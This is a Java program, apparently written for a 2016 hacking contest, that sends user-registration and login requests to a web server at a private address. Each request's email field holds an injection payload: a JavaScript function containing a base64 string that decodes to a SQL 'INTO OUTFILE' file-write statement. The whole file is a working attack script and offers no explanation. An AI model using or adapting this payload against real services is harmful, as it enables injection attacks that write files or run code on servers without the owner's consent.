package com.example.jasonxddd.tku2016hack;

/**
 * Created by Hati on 2016/4/2.
 */
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class connet_server {

    public static void main(String[] args)throws IOException,JSONException{

        add_user();
        login();

    }

    private static void add_user()throws IOException,JSONException{

        JSONObject json = new JSONObject();
        json.put("firstName","");
        json.put("lastName","b");
        json.put("username","b");
        json.put("email","function(){var buf = new Buffer('U0VMRUNUIElOVE8gT1VURklMRSAnLi9YRC5pbmRleCcgTElORVMgVEVSTUlOQVRFRCBCWSAnXG4nOw==', 'base64');}();");
        json.put("password","XD");

        String target = "http://192.168.40.143:3080/user/add";

        URL url = new URL(target);

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(5000);
        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setRequestMethod("POST");
        OutputStream os = conn.getOutputStream();
        os.write(json.toString().getBytes("UTF-8"));
        os.close();

        // read the response
        InputStream is = new BufferedInputStream(conn.getInputStream());
        Scanner s = new Scanner(is).useDelimiter("\\A");
        String result = s.hasNext() ? s.next() : "";

        is.close();
        conn.disconnect();

        System.out.print(result);
    }

    private static void login()throws IOException,JSONException{

        JSONObject json = new JSONObject();

        json.put("email","function(){var buf = new Buffer('U0VMRUNUIElOVE8gT1VURklMRSAnLi9YRC5pbmRleCcgTElORVMgVEVSTUlOQVRFRCBCWSAnXG4nOw==', 'base64');}();");
        json.put("password","XD");

        String target = "http://192.168.40.143:3080/user/login";

        URL url = new URL(target);

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(5000);
        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setRequestMethod("POST");
        OutputStream os = conn.getOutputStream();
        os.write(json.toString().getBytes("UTF-8"));
        os.close();

        // read the response
        InputStream is = new BufferedInputStream(conn.getInputStream());
        Scanner s = new Scanner(is).useDelimiter("\\A");
        String result = s.hasNext() ? s.next() : "";

        is.close();
        conn.disconnect();

        System.out.print(result);
    }


}
